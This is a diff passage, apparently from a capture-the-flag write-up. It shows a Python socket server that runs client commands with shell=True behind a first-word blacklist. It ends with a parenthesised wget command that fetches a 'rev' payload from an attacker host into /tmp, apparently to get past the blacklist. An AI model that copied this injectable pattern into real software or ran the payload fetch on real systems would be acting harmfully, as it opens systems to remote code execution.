+
+                command = data.split(" ")
+
+                for i in bad_man_words:
+                    if i == command[0]:
+                        command_is_not_evil = 0
+
+                #EXECUTE
+                if command_is_not_evil == 1:
+                    print("running: " + data)
+                    try:
+                        outdata = subprocess.check_output(data,shell=True)
+                        outdata = "Command Excecuted"
+                    except:
+                        outdata = "Unknown Command"
+                    forwardmessage(outdata)
+                elif command_is_not_evil == -1:
+                    outdata = "Did not execute because command has been stringed"
+                    forwardmessage(outdata)
+                else:
+                    outdata = "Did not execute command because it was dangerous/backlisted!"
+                    forwardmessage(outdata)
+            if solved == 0:
+                outdata = "Incorrect Flag"
+                forwardmessage(outdata)
+                conn.close()
+        except:
+            outdata = "Error Closing Connection..."
+            forwardmessage(outdata)
+            conn.close()
+    conn.close()
+while 1:
+    conn, addr = s.accept()
+    print('Client connected ' + addr[0] + ':' + str(addr[1]))
+    start_new_thread(clientThread, (conn,))
+s.close()
+
+
+```
+
+
+
+(wget -O /tmp/rev http://192.168.110.1:8000/rev)
+(wget -O /tmp/rev http://192.168.110.1:8000/rev)
